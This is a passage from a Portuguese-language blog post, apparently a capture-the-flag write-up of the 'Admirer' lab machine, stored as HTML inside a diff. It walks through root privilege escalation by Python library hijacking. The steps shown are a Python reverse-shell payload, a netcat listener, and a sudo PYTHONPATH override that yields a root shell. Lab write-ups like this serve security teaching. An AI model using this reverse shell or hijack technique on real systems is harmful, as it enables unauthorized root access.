+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">putenv</span><span class="p">(</span><span class="s">"HISTFILE"</span><span class="p">,</span><span class="s">'/dev/null'</span><span class="p">)</span>
+<span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p><br /><br /></p>
+
+<p>Mas ao executar o comando não retornou nenhuma conexão de shell reversa <strong>:(</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo@admirer:/tmp/privesc<span class="nv">$ </span><span class="nb">sudo</span> /opt/scripts/admin_tasks.sh 6
+Running backup script <span class="k">in </span>the background, it might take a <span class="k">while</span>...
+
+<span class="nt">-----</span> Outra Shell
+
+nc <span class="nt">-lvvnp</span> 4444
+Listening on any address 4444 <span class="o">(</span>krb524<span class="o">)</span>
+</code></pre></div></div>
+<p><br />
+Então realizei o teste sem usar sudo somente o user <strong>waldo</strong> para executar o backup.py e ver se retornava shell e se o library hijacking estava realmente funcionando.</p>
+
+<p>Obs(<em>Tem que executar diretamente o backup.py porque se executar pelo script admin_tasks ele exige ser executado com privilégio de root</em>)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo@admirer:/tmp/privesc<span class="nv">$ </span>python3 /opt/scripts/backup.py 
+
+<span class="c">#Aqui o terminal ficou travado então olhando para a outra janela onde o netcat estava escutando temos a shell.</span>
+
+nc <span class="nt">-lvvnp</span> 4444
+Listening on any address 4444 <span class="o">(</span>krb524<span class="o">)</span>
+Connection from 10.10.10.187:57390
+waldo@admirer:/tmp/privesc<span class="nv">$ </span>
+</code></pre></div></div>
+<p><br />
+Retornou uma shell, então está provado que <strong>Library Hicjaking</strong> está funcionando, com isso descobrimos que o problema é o <strong>PYTHONPATH</strong> que quando modifico, ele fica apenas no contexto do usuário e não como uma variável que se estende até o root , e quando o script é executado como root ele precisa “enxergar” esse PATH, então temos que passar o PATH durante a execução do sudo.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo@admirer<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/privesc /opt/scripts/admin_tasks.sh 6
+Running backup script <span class="k">in </span>the background, it might take a <span class="k">while</span>...
+
+<span class="c">#Verificando o terminal do netcat.</span>
+
+Listening on any address 4444 <span class="o">(</span>krb524<span class="o">)</span>
+Connection from 10.10.10.187:57414
+root@admirer:/tmp/privesc# 
+
+<span class="c">#Pronto privesc realizado.</span>
+
+root@admirer:/tmp/privesc# <span class="nb">cat</span> /root/root.txt
+<span class="nb">cat</span> /root/root.txt
+42e42a8<span class="k">*******</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<hr />
+<p>Autor: Sandro M. Silva aka CorvodaMorte
+<br /><br />
+Um agradecimento especial ao <strong>VSouza</strong> aka <strong>idHreusen</strong> que ajudou na exploração com acesso mysql remoto :) vlw.</p>
+
+<p><strong>Referências</strong></p>
+
+<p><a href="https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f</a></p>
+
+<p><a href="https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7">https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7</a></p>
+
+  </article>
+
+	<p class="feed-recomendation">
+		Gostou do post? Assina o <a href="/feed/">feed</a> e seja feliz!!
+	</p>
+
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <footer>
+      Thx!
+    </footer>
+  </div>
+</div>
+
+
+      </div>
+    </body>
+</html>
